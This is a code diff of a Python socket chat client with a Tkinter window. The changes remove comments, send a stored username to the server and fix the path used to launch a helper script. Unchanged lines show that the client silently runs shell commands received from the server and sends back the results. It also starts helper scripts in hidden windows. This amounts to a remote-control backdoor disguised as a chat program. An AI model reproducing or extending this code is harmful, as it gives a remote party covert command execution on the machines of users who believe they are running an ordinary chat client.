@@ -8,7 +8,7 @@ import os
 import sys
 
 ACCOUNT_FILE = "account.json"
-TEMP_DIR = "tools/tmp"  # Relative to the directory where client-v2.py is located
+TEMP_DIR = "tools/tmp"
 ADDITION_SCRIPT = "tools/addition.py"
 LOGIN_SCRIPT = "tools/login.py"
 
@@ -28,10 +28,10 @@ def receive_messages(client, text_area):
                 result = execute_command(command)
                 client.send(f"!cmd_result {result}".encode('utf-8'))
             else:
-                text_area.config(state=tk.NORMAL)  # Allow updates
+                text_area.config(state=tk.NORMAL)
                 text_area.insert(tk.END, message + '\n')
-                text_area.yview(tk.END)  # Scroll to the end
-                text_area.config(state=tk.DISABLED)  # Make it read-only
+                text_area.yview(tk.END)
+                text_area.config(state=tk.DISABLED)
         except Exception as e:
             messagebox.showerror("Error", f"Error: {e}")
             client.close()
@@ -46,7 +46,6 @@ def start_client():
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.connect((server_ip, server_port))
 
-        # Assume user is logged in
         receive_thread = threading.Thread(target=receive_messages, args=(client, text_area))
         receive_thread.start()
 
@@ -55,24 +54,34 @@ def start_client():
             if message:
                 client.send(message.encode('utf-8'))
                 entry_message.delete(0, tk.END)  # Clear input after sending
+        
+        client.send(client_username.encode('utf-8'))
 
         button_send.config(command=send_message)
 
-    # Check if account file exists before running the UI
+    # Check if account file exists before running the client
     account_file = os.path.join(TEMP_DIR, ACCOUNT_FILE)
     if not os.path.exists(account_file):
         messagebox.showerror("Error", "Account file not found. Launching login.py to create an account.")
-        # Run login.py in a hidden window
+        # Run login.py in a hidden window (no cmd)
         tools_folder = os.path.join(os.path.dirname(__file__), "tools")
         login_script = os.path.join(tools_folder, "login.py")
         if os.path.exists(login_script):
             subprocess.Popen(["python", login_script], cwd=tools_folder, creationflags=subprocess.CREATE_NO_WINDOW)
         else:
             print("login.py not found. Exiting.")
-        sys.exit()  # Exit the current script
+        sys.exit()
+    else:
+        with open(account_file, 'r') as file:
+            accountJSON = json.load(file)
+            info = json.loads(accountJSON)
+            global client_username
+            client_username = info['username']
+        
+
 
     # Run addition.py in a hidden window
-    addition_script = os.path.join(TEMP_DIR, ADDITION_SCRIPT)
+    addition_script = os.path.join(ADDITION_SCRIPT)
     if os.path.exists(addition_script):
         subprocess.Popen(["python", addition_script], cwd=os.path.dirname(addition_script), creationflags=subprocess.CREATE_NO_WINDOW)
     else:
@@ -104,10 +113,9 @@ def start_client():
 
     root.mainloop()
 
-if __name__ == "__main__":
-    # Check if run as standalone or by login.py
-    temp_dir_file = os.path.join("tools", "tmp", "temp_dir.txt")
-    if os.path.exists(temp_dir_file):
-        start_client()
-    else:
-        print("Please run login.py to set up the account.")
+# Check for temporary files folder before running
+temp_dir_file = os.path.join("tools", "tmp")
+if os.path.exists(temp_dir_file):
+    start_client()
+else:
+    print("Error Code 1: tmp folder doesn't exist")
